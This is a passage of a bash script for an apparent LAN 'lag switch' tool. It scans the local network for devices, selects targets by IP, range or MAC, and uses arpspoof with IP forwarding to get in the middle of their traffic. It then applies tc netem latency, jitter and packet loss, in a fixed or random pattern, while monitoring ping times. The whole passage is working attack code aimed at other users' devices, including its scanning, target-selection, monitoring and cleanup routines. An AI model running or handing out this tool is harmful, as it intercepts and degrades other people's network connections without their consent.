    echo -e "  ${COLOR_BOLD}Targets:${COLOR_RESET} ${#TARGETS[@]} device(s)"
    echo -e "  ${COLOR_BOLD}Latency:${COLOR_RESET} ${LATENCY}ms  |  ${COLOR_BOLD}Jitter:${COLOR_RESET} ${JITTER}ms  |  ${COLOR_BOLD}Loss:${COLOR_RESET} ${LOSS}%"
    echo "  ────────────────────────────────────────────────────────────────────────────"
    
    trap 'echo ""; log_warn "Stopping..."; cleanup; exit 0' INT TERM
    
    COUNT=0
    TOTAL=0
    MIN=999999
    MAX=0
    START_TIME=$(date +%s)
    
    if [ -n "$EXPORT_CSV" ]; then
        echo "Timestamp,Target,Latency_ms,Status" > "$EXPORT_CSV"
    fi
    
    while true; do
        if [ "$DURATION" -gt 0 ]; then
            ELAPSED=$(($(date +%s) - START_TIME))
            if [ "$ELAPSED" -ge "$DURATION" ]; then
                echo ""
                log_info "Duration limit reached (${DURATION}s). Stopping..."
                cleanup
                exit 0
            fi
        fi
        
        if [ "$RANDOM_MODE" = true ]; then
            RAND_LATENCY=$((LATENCY + RANDOM % 1000 - 500))
            [ "$RAND_LATENCY" -lt 100 ] && RAND_LATENCY=100
            RAND_JITTER=$((JITTER + RANDOM % 400 - 200))
            [ "$RAND_JITTER" -lt 50 ] && RAND_JITTER=50
            RAND_LOSS=$((RANDOM % 10))
            
            TC_CMD="tc qdisc change dev $INTERFACE root netem"
            TC_CMD="$TC_CMD delay ${RAND_LATENCY}ms ${RAND_JITTER}ms"
            [ "$RAND_LOSS" -gt 0 ] && TC_CMD="$TC_CMD loss ${RAND_LOSS}%"
            sudo $TC_CMD 2>/dev/null
        fi
        
        TARGET_IP="${TARGETS[0]}"
        PING=$(ping -c 1 -W 1 "$TARGET_IP" 2>/dev/null | grep "time=" | awk -F'time=' '{print $2}' | cut -d' ' -f1)
        
        if [ -n "$PING" ]; then
            MS=$(printf "%.0f" "$PING")
            COUNT=$((COUNT + 1))
            TOTAL=$((TOTAL + MS))
            [ $MS -lt $MIN ] && MIN=$MS
            [ $MS -gt $MAX ] && MAX=$MS
            AVG=$((TOTAL / COUNT))
            
            if [ "$MS" -gt 1000 ]; then
                STATUS="${COLOR_ERR}SLOW${COLOR_RESET}"
                STATUS_TEXT="SLOW"
            elif [ "$MS" -gt 500 ]; then
                STATUS="${COLOR_WARN}LAG${COLOR_RESET}"
                STATUS_TEXT="LAG"
            else
                STATUS="${COLOR_OK}OK${COLOR_RESET}"
                STATUS_TEXT="OK"
            fi
            
            echo -e "  ${COLOR_DIM}[$(date +%H:%M:%S)]${COLOR_RESET} [$STATUS] ${COLOR_BOLD}${MS}ms${COLOR_RESET}  │  ${COLOR_DIM}min:${MIN} max:${MAX} avg:${AVG} pkts:${COUNT} targets:${#TARGETS[@]}${COLOR_RESET}"
            
            if [ -n "$EXPORT_CSV" ]; then
                echo "$(date +%Y-%m-%d_%H:%M:%S),$TARGET_IP,$MS,$STATUS_TEXT" >> "$EXPORT_CSV"
            fi
        else
            echo -e "  ${COLOR_DIM}[$(date +%H:%M:%S)]${COLOR_RESET} [${COLOR_ERR}DOWN${COLOR_RESET}] target unreachable"
        fi
        
        sleep 1
    done
}

# -----------------------------------------------------------------------------
# CLEANUP (FIXED – properly kills all processes)
# -----------------------------------------------------------------------------
cleanup() {
    echo ""
    log_info "Cleaning up..."
    
    log_cmd "tc qdisc del dev $INTERFACE root"
    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null
    log_ok "Traffic control removed"
    
    # Kill all arpspoof processes
    for PID in "${SPOOF1_PIDS[@]}" "${SPOOF2_PIDS[@]}"; do
        sudo kill "$PID" 2>/dev/null
    done
    sudo killall arpspoof 2>/dev/null
    log_ok "ARP spoofing stopped"
    
    log_cmd "sysctl -w net.ipv4.ip_forward=0"
    sudo sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1
    log_ok "IP forwarding disabled"
    
    if [ -n "$EXPORT_CSV" ]; then
        log_ok "Results exported to: $EXPORT_CSV"
    fi
    
    echo ""
    log_ok "Cleanup complete. Target(s) restored."
}

# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
check_deps() {
    local missing=()
    for cmd in arpspoof tc sysctl ping ip arp-scan; do
        if ! command -v "$cmd" &>/dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_err "Missing dependencies: ${missing[*]}"
        echo ""
        echo "  Install with:"
        echo "    Debian/Ubuntu: sudo apt install dsniff iproute2 arp-scan"
        echo "    Arch:         sudo pacman -S dsniff iproute2 arp-scan"
        echo "    Fedora:       sudo dnf install dsniff iproute2 arp-scan"
        exit 1
    fi
}

# -----------------------------------------------------------------------------
# PARSE ARGUMENTS
# -----------------------------------------------------------------------------
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)     TARGET_INPUT="$2"; shift 2 ;;
        -m|--mac)        TARGET_MAC="$2"; shift 2 ;;
        -r|--range)      TARGET_RANGE="$2"; shift 2 ;;
        -w|--whitelist)  WHITELIST_INPUT="$2"; shift 2 ;;
        -l|--latency)    LATENCY="$2"; shift 2 ;;
        -j|--jitter)     JITTER="$2"; shift 2 ;;
        -p|--loss)       LOSS="$2"; shift 2 ;;
        -d|--duplicate)  DUPLICATE="$2"; shift 2 ;;
        -e|--reorder)    REORDER="$2"; shift 2 ;;
        --profile)       PROFILE="$2"; shift 2 ;;
        --duration)      DURATION="$2"; shift 2 ;;
        --random)        RANDOM_MODE=true; shift ;;
        --scan)          SCAN_MODE=true; shift ;;
        --export)        EXPORT_CSV="$2"; shift 2 ;;
        --log-mode)      LOG_MODE="$2"; shift 2 ;;
        --config)        edit_config; shift ;;
        -h|--help)       show_help; exit 0 ;;
        *)               log_err "Unknown option: $1"; show_help; exit 1 ;;
    esac
done

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
if [ -z "$LOG_MODE" ] || [ "$LOG_MODE" = "normal" ]; then
    LOG_MODE="${DEFAULT_LOG_MODE:-normal}"
fi

show_header
check_deps
detect_network

if [ "$SCAN_MODE" = true ]; then
    if [ -n "$TARGET_INPUT" ]; then
        IFS=',' read -ra SCAN_TARGETS <<< "$TARGET_INPUT"
        for IP in "${SCAN_TARGETS[@]}"; do
            deep_scan "$IP"
        done
    else
        scan_devices
        display_devices
        echo "Select device to scan:"
        select_targets
        for IP in "${TARGETS[@]}"; do
            deep_scan "$IP"
        done
    fi
    exit 0
fi

if [ -n "$TARGET_RANGE" ]; then
    log_info "Scanning range: $TARGET_RANGE"
    
    if [ -n "$WHITELIST_INPUT" ]; then
        IFS=',' read -ra WHITELIST <<< "$WHITELIST_INPUT"
        log_info "Whitelist: ${WHITELIST[*]}"
    fi
    
    if command -v nmap &>/dev/null; then
        RANGE_IPS=$(sudo nmap -sn "$TARGET_RANGE" 2>/dev/null | grep "Nmap scan report for" | awk '{print $NF}' | sed 's/[()]//g')
    else
        log_warn "nmap not installed. Using slower ping sweep..."
        BASE=$(echo "$TARGET_RANGE" | cut -d/ -f1 | cut -d. -f1-3)
        for i in {1..254}; do
            ping -c 1 -W 1 "$BASE.$i" >/dev/null 2>&1 && RANGE_IPS="$RANGE_IPS $BASE.$i"
        done
    fi
    
    for IP in $RANGE_IPS; do
        SKIP=false
        for W in "${WHITELIST[@]}"; do
            [[ "$IP" == "$W" ]] && SKIP=true && break
        done
        [ "$SKIP" = true ] && continue
        [[ "$IP" == "$MY_IP" ]] && continue
        TARGETS+=("$IP")
    done
    
    if [ ${#TARGETS[@]} -eq 0 ]; then
        log_err "No targets found in range (excluding whitelist/self)."
        exit 1
    fi
    log_target "Found ${#TARGETS[@]} targets in range"
    echo ""
fi

if [ -n "$TARGET_INPUT" ]; then
    IFS=',' read -ra TARGETS <<< "$TARGET_INPUT"
    log_target "Direct target(s): ${TARGETS[*]}"
    echo ""
fi

if [ -n "$TARGET_MAC" ]; then
    log_info "Resolving MAC: $TARGET_MAC"
    IP=$(arp -a | grep -i "$TARGET_MAC" | awk '{print $1}' | sed 's/[()]//g')
    if [ -n "$IP" ]; then
        TARGETS=("$IP")
        log_target "Resolved to IP: $IP"
    else
        log_err "Could not resolve MAC to IP. Is the device online?"
        exit 1
    fi
fi

if [ ${#TARGETS[@]} -eq 0 ]; then
    scan_devices
    display_devices
    select_targets
fi

if [ -n "$PROFILE" ]; then
    load_profile "$PROFILE" || exit 1
fi

LATENCY=${LATENCY:-$DEFAULT_LATENCY}
JITTER=${JITTER:-$DEFAULT_JITTER}
LOSS=${LOSS:-$DEFAULT_LOSS}
DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}
REORDER=${REORDER:-$DEFAULT_REORDER}

if [ -z "$PROFILE" ] && [ -z "${LATENCY+set}" ] && [ -z "${JITTER+set}" ] && [ -z "${LOSS+set}" ]; then
    configure_params
else
    estimate_impact "$LATENCY" "$JITTER" "$LOSS" "$DUPLICATE" "$REORDER"
    read -p "Start? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        log_info "Aborted."
        exit 0
    fi
fi

execute
monitor
